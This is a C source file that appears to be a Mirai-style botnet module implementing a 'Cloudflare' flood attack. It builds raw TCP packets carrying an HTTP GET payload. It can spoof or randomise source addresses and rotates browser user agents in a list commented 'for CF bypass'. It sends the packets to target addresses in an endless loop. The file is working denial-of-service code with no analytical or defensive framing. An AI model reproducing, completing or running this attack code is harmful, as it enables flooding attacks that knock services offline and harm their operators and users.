#define _GNU_SOURCE

#ifdef DEBUG
#include <stdio.h>
#endif
#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <linux/ip.h>
#include <linux/tcp.h>
#include <errno.h>
#include <time.h>
#include <string.h>

#include "includes.h"
#include "attack.h"
#include "checksum.h"
#include "rand.h"
#include "util.h"

void attack_cloudflare(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
    int i, fd;
    char **pkts = calloc(targs_len, sizeof(char *));
    uint8_t ip_tos = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TOS, 0);
    uint16_t ip_ident = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_IDENT, 0xffff);
    uint8_t ip_ttl = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TTL, 64);
    BOOL dont_frag = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_DF, FALSE);
    port_t sport = attack_get_opt_int(opts_len, opts, ATK_OPT_SPORT, 0xffff);
    port_t dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 443);
    uint32_t seq = attack_get_opt_int(opts_len, opts, ATK_OPT_SEQ, 0xffff);
    uint32_t ack = attack_get_opt_int(opts_len, opts, ATK_OPT_ACK, 0);
    uint32_t source_ip = attack_get_opt_int(opts_len, opts, ATK_OPT_SOURCE, LOCAL_ADDR);
    char *http_path = attack_get_opt_str(opts_len, opts, ATK_OPT_HTTP_PATH, "/");
    char *useragent = attack_get_opt_str(opts_len, opts, ATK_OPT_USERAGENT, "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36");
    char *cookies = attack_get_opt_str(opts_len, opts, ATK_OPT_COOKIES, "");

    // Build HTTP request payload
    char cf_payload[1024];
    int payload_len;

    // Random user-agent array for CF bypass
    char *uas[] = {
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1"
    };
    int num_uas = 5;

    // Select random UA
    char *ua = uas[rand_next() % num_uas];

    payload_len = util_strlen("GET ") + util_strlen(http_path) + util_strlen(" HTTP/1.1\r\nHost: ") + util_strlen("Host") + util_strlen("\r\nUser-Agent: ") + util_strlen(ua) + util_strlen("\r\nAccept: */*\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate, br\r\nConnection: keep-alive\r\nUpgrade-Insecure-Requests: 1\r\n");
    if (util_strlen(cookies) > 0)
        payload_len += util_strlen("Cookie: ") + util_strlen(cookies) + util_strlen("\r\n");
    payload_len += util_strlen("\r\n");
    if (payload_len > 1024) payload_len = 1024;

    util_strcpy(cf_payload, "GET ");
    util_strcpy(cf_payload + util_strlen(cf_payload), http_path);
    util_strcpy(cf_payload + util_strlen(cf_payload), " HTTP/1.1\r\nHost: ");
    util_strcpy(cf_payload + util_strlen(cf_payload), "Host");
    util_strcpy(cf_payload + util_strlen(cf_payload), "\r\nUser-Agent: ");
    util_strcpy(cf_payload + util_strlen(cf_payload), ua);
    util_strcpy(cf_payload + util_strlen(cf_payload), "\r\nAccept: */*\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate, br\r\nConnection: keep-alive\r\nUpgrade-Insecure-Requests: 1\r\n");
    if (util_strlen(cookies) > 0)
    {
        util_strcpy(cf_payload + util_strlen(cf_payload), "Cookie: ");
        util_strcpy(cf_payload + util_strlen(cf_payload), cookies);
        util_strcpy(cf_payload + util_strlen(cf_payload), "\r\n");
    }
    util_strcpy(cf_payload + util_strlen(cf_payload), "\r\n");

    if ((fd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)) == -1)
    {
#ifdef DEBUG
        printf("Failed to create raw socket. Aborting Cloudflare attack\n");
#endif
        return;
    }
    i = 1;
    if (setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &i, sizeof(int)) == -1)
    {
#ifdef DEBUG
        printf("Failed to set IP_HDRINCL. Aborting\n");
#endif
        close(fd);
        return;
    }

    for (i = 0; i < targs_len; i++)
    {
        struct iphdr *iph;
        struct tcphdr *tcph;
        char *data;

        pkts[i] = calloc(1510, sizeof(char));
        iph = (struct iphdr *)pkts[i];
        tcph = (struct tcphdr *)(iph + 1);
        data = (char *)(tcph + 1);

        iph->version = 4;
        iph->ihl = 5;
        iph->tos = ip_tos;
        iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr) + payload_len);
        iph->id = htons(ip_ident);
        iph->ttl = ip_ttl;
        if (dont_frag)
            iph->frag_off = htons(1 << 14);
        iph->protocol = IPPROTO_TCP;
        iph->saddr = source_ip;
        iph->daddr = targs[i].addr;

        tcph->source = htons(sport);
        tcph->dest = htons(dport);
        tcph->seq = htonl(seq);
        tcph->ack = htonl(ack);
        tcph->doff = 5;
        tcph->psh = 1;
        tcph->ack_seq = 1;
        tcph->syn = 1;
        tcph->window = rand_next() & 0xffff;

        util_memcpy(data, cf_payload, payload_len);
    }

    while (TRUE)
    {
        for (i = 0; i < targs_len; i++)
        {
            char *pkt = pkts[i];
            struct iphdr *iph = (struct iphdr *)pkt;
            struct tcphdr *tcph = (struct tcphdr *)(iph + 1);

            if (targs[i].netmask < 32)
                iph->daddr = htonl(ntohl(targs[i].addr) + (((uint32_t)rand_next()) >> targs[i].netmask));

            if (source_ip == 0xffffffff)
                iph->saddr = rand_next();

            if (ip_ident == 0xffff)
                iph->id = (uint16_t)rand_next();
            if (sport == 0xffff)
                tcph->source = rand_next();
            if (dport == 0xffff)
                tcph->dest = rand_next();

            if (seq == 0xffff)
                tcph->seq = rand_next();

            tcph->check = 0;
            iph->check = 0;
            iph->check = checksum_generic((uint16_t *)iph, sizeof(struct iphdr));
            tcph->check = checksum_tcpudp(iph, tcph, htons(sizeof(struct tcphdr) + payload_len), sizeof(struct tcphdr) + payload_len);

            targs[i].sock_addr.sin_port = tcph->dest;
            sendto(fd, pkt, sizeof(struct iphdr) + sizeof(struct tcphdr) + payload_len, MSG_NOSIGNAL, (struct sockaddr *)&targs[i].sock_addr, sizeof(struct sockaddr_in));
        }
    }
}
